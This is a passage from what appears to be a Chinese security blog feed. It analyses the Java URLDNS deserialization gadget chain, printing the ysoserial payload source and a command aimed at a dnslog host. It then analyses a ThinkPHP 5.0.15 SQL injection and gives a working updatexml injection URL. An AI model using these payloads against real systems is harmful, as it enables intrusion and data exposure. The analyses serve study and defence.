ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大体来分析payload构造流程，</p><p><code>Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);</code></p><p>getDeclaredField获取一个类本身（不包括父类）所有属性，  f.setAccessible(true);将字段设置为允许修改。</p><p>其中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">hashMap.put(url, <span class="string">&quot;rmb122&quot;</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这里操作比较蜜汁，先将url的hashcode设为0xdeadbeef，执行put将url对象添加到散列表。</p><p>然后在设为-1。根据前面的分析，只有url.hashCode=-1时，才能执行dns请求。</p><p>这里这样写的原因是因为put添加数据时也会调用putVal()，此处和readObject()函数是一样的</p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/4.1.png" alt="4.1"></p><p>readObject()–&gt;putVal:</p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/4.2.png" alt="4.2"></p><p>会进行dns请求。这样会导致在payload构造时本地主机即会请求一次dnslog。可能对后面利用dnslog检测反序列化漏洞造成干扰。</p><p>所以在put时先将url.hashCode设置为-1以外的值。put添加数据之后再还原回-1。至于为啥是-1。是因为java.net.URL#hashCode()的逻辑判断：</p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/4.3.png" alt="4.3"></p><h2 id="0x05-ysoserial利用链分析"><a href="#0x05-ysoserial利用链分析" class="headerlink" title="0x05 ysoserial利用链分析"></a>0x05 ysoserial利用链分析</h2><p>上面用到的方法和ysoserial的方法还是有区别的，我们来看看ysoserial是如何生成payload的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ysoserial实现了一个SilentURLStreamHandler类，并重写了InetAddress.getHostAddress()方法，使其返回null。这样生成payload时调用到此处直接返回null，并不会进行dns请求。</p><p>但是此处存在一个疑问，ysoserial重写了InetAddress.getHostAddress()让其放回null，那么我们反序列化还怎么让它进行dns请求呢？</p><p>主要看这里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">               <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">               URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">               HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">               URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br></pre></td></tr></table></figure><p>ysoserial做了解释<code>Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient</code>    handler是瞬态的。</p><p>进入URL类查看handler属性，handler之前有一个transient关键字。</p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/5.2.png" alt="5.2"></p><p>transient关键字介绍：<br><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/5.1.png" alt="5.1"></p><p>所以handler属性在序列化时并被序列化。这样在进行反序列化时handler为默认的URLStreamHandler类属性，继续执行URLStreamHandler类里的InetAddress.getHostAddress()方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y  -jar  ysoserial-0.0.6-SNAPSHOT-all.jar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -agentlib:jdwp=transport=dt_socket,server=n,address=10.45.9.48:5005,suspend=y -jar  ysoserial-0.0.6-SNAPSHOT-all.jar</span><br></pre></td></tr></table></figure><h2 id="0x06-ysoserial调试"><a href="#0x06-ysoserial调试" class="headerlink" title="0x06 ysoserial调试"></a>0x06 ysoserial调试</h2><p>ysoserial可以idea起端口，ysoserial链接进行调试。</p><ol><li><p>首先在建立一个远程调试端口：<br><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/6.1.png" alt="6.1"></p></li><li><p>点击debug进入监听状态</p></li><li><p>terminal输入ysoserial启动语句(不同版本可能不一样，可以直接复制command line argument for remote JVM 去掉&lt;&gt;两个参数，根据实际需求修改)</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=n,address=<span class="number">10.45</span><span class="number">.9</span><span class="number">.48</span>:<span class="number">5005</span>,suspend=y -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar URLDNS <span class="string">&quot;http://maazpy.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/6.2.png" alt="6.2"></p><p>生成payload时执行到SilentURLStreamHandler的getHostAddress()方法返回null，就不会产生dns请求。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p>p神知识星球-反序列化系列（1-3）</p><p><a href="https://www.anquanke.com/post/id/201762">JAVA反序列化-ysoserial-URLDNS</a></p><p><a href="http://wjlshare.com/archives/1493">Java反序列化-URLDNS</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化URLDNS </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> URLDNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.0.15 SQL注入漏洞挖掘分析</title>
      <link href="/2019/07/05/Thinkphp%205.0.15%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%86%E6%9E%90/"/>
      <url>/2019/07/05/Thinkphp%205.0.15%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>2018年3月26日tp进行了一次安全更新。</p><p><img src="1.1.png" alt="1.1"></p><p>本次更新大佬们立马找到了漏洞点并给出了paylaod：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public/index.php/index/index/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure><p>本篇文章主要分析漏洞存在点的定位，payload的构造。分析一下大佬们是怎么处理开源cms安全更新，并构造exp的。</p><p>涉及版本：<strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p><h2 id="1-Tp5-0-16的安全更新："><a href="#1-Tp5-0-16的安全更新：" class="headerlink" title="1.Tp5.0.16的安全更新："></a>1.Tp5.0.16的安全更新：</h2><p><img src="1.2.png" alt="1.2"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line"> <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$item</span> . <span class="string">&#x27;+&#x27;</span> . floatval(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$key</span> == <span class="variable">$val</span>[<span class="number">1</span>]) &#123;                        </span><br><span class="line">           <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$item</span> . <span class="string">&#x27;+&#x27;</span> . floatval(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>本次更新对library/think/db/Builder.php中获取到的参数增加了判断：判断输入值必须和数据库字段值相等才能进行下一步的代码拼接。</p><p>从这个点可以判断本次安全更新极大可能与sql注入有关。</p><h3 id="Inc-dec-exp函数解析："><a href="#Inc-dec-exp函数解析：" class="headerlink" title="Inc,dec,exp函数解析："></a>Inc,dec,exp函数解析：</h3><p>可以参考官方文档：</p><p><img src="1.3.png" alt="1.3"></p><p>这三个方法主要用在sql链式操作。</p><p>用法示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// score 字段加 1</span></span><br><span class="line">Db::table(<span class="string">&#x27;think_user&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;setInc(<span class="string">&#x27;score&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// score 字段减 1</span></span><br><span class="line">Db::table(<span class="string">&#x27;think_user&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;setDec(<span class="string">&#x27;score&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择id=1，3，8三个值的列</span></span><br><span class="line">where(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="string">&#x27; IN (1,3,8) &#x27;</span>);</span><br><span class="line"><span class="comment">//exp查询的条件不会被当成字符串，所以后面的查询条件可以使用任何SQL支持的语法，包括使用函数和字段名称。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//综合使用</span></span><br><span class="line">Db::table(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    -&gt;where(<span class="string">&#x27;id&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">    -&gt;inc(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">    -&gt;dec(<span class="string">&#x27;score&#x27;</span>,<span class="number">3</span>)</span><br><span class="line">    -&gt;exp(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;UPPER(name)&#x27;</span>)</span><br><span class="line">    -&gt;update();</span><br><span class="line"><span class="comment">//该语句的意思是查询data表并将id=1的列字段值score+3，并将name值改为大写。</span></span><br></pre></td></tr></table></figure><h2 id="2-产生sql注入的原因"><a href="#2-产生sql注入的原因" class="headerlink" title="2.产生sql注入的原因"></a>2.产生sql注入的原因</h2><h3 id="用到parseData-函数的地方"><a href="#用到parseData-函数的地方" class="headerlink" title="用到parseData()函数的地方"></a>用到parseData()函数的地方</h3><p>根据官方的更新判断出本次更新和sql注入有关，涉及的函数为<code>parseData()</code>全局搜索用到该函数的地方：</p><p><img src="2.1.png" alt="2.1"></p><h3 id="builder类的insert-用到了parseData"><a href="#builder类的insert-用到了parseData" class="headerlink" title="builder类的insert()用到了parseData()"></a>builder类的insert()用到了parseData()</h3><p>其中builder类的insert方法用到了该函数，并将该函数解析的数据拼接到了<code>$sql</code>参数中，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$options</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分析并处理数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;parseData(<span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        返回数组的所有键值，返回值为数组</span></span><br><span class="line">        <span class="variable">$fields</span> = array_keys(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">//        返回数组的所有的值</span></span><br><span class="line">        <span class="variable">$values</span> = array_values(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********重点***********/</span></span><br><span class="line"><span class="comment">//        通过替换的方式拼接sql语句</span></span><br><span class="line"><span class="comment">//        将$this-&gt;insertSql中的[&#x27;%INSERT%&#x27;, &#x27;%TABLE%&#x27;, &#x27;%FIELD%&#x27;, &#x27;%DATA%&#x27;, &#x27;%COMMENT%&#x27;]依此替换为获取的值</span></span><br><span class="line"><span class="comment">//        该处并没有任何过滤函数</span></span><br><span class="line">        <span class="variable">$sql</span> = str_replace(</span><br><span class="line">            [<span class="string">&#x27;%INSERT%&#x27;</span>, <span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%DATA%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>],</span><br><span class="line">            [</span><br><span class="line">                <span class="variable">$replace</span> ? <span class="string">&#x27;REPLACE&#x27;</span> : <span class="string">&#x27;INSERT&#x27;</span>,</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line"><span class="comment">//                用&#x27;，&#x27;链接所有数组元素。所以这里将data数组中的键值变为了&#x27;,&#x27;链接的字符串</span></span><br><span class="line">                implode(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$fields</span>),</span><br><span class="line">                implode(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$values</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            ], <span class="keyword">$this</span>-&gt;insertSql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以现在大概可以确定insert方法存在sql注入，会将输入的参数直接拼接返回sql语句。</p><h3 id="tp框架内置insert函数分析："><a href="#tp框架内置insert函数分析：" class="headerlink" title="tp框架内置insert函数分析："></a>tp框架内置insert函数分析：</h3><p>tp内使用insert()添加数据时，使用的insert()函数调用了builder类的insert()函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span>, <span class="variable">$getLastInsID</span> = <span class="literal">false</span>, <span class="variable">$sequence</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分析查询表达式</span></span><br><span class="line">        <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;parseExpress();</span><br><span class="line">        <span class="variable">$data</span>    = array_merge(<span class="variable">$options</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$data</span>);</span><br><span class="line">        </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/****************重点**************/</span></span><br><span class="line">  <span class="comment">//将获取到的data数组，用builder类的insert方法处理生成sql语句</span></span><br><span class="line">     </span><br><span class="line">  <span class="comment">// 生成SQL语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;builder-&gt;insert(<span class="variable">$data</span>, <span class="variable">$options</span>, <span class="variable">$replace</span>);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取参数绑定</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="keyword">$this</span>-&gt;getBind();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) &#123;</span><br><span class="line">            <span class="comment">// 获取实际执行的SQL语句</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;connection-&gt;getRealSql(<span class="variable">$sql</span>, <span class="variable">$bind</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行操作</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="number">0</span> === <span class="variable">$sql</span> ? <span class="number">0</span> : <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>, <span class="variable">$bind</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$sequence</span>  = <span class="variable">$sequence</span> ?: (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;sequence&#x27;</span>]) ? <span class="variable">$options</span>[<span class="string">&#x27;sequence&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line">            <span class="variable">$lastInsId</span> = <span class="keyword">$this</span>-&gt;getLastInsID(<span class="variable">$sequence</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$lastInsId</span>) &#123;</span><br><span class="line">                <span class="variable">$pk</span> = <span class="keyword">$this</span>-&gt;getPk(<span class="variable">$options</span>);</span><br><span class="line">                <span class="keyword">if</span> (is_string(<span class="variable">$pk</span>)) &#123;</span><br><span class="line">                    <span class="variable">$data</span>[<span class="variable">$pk</span>] = <span class="variable">$lastInsId</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span 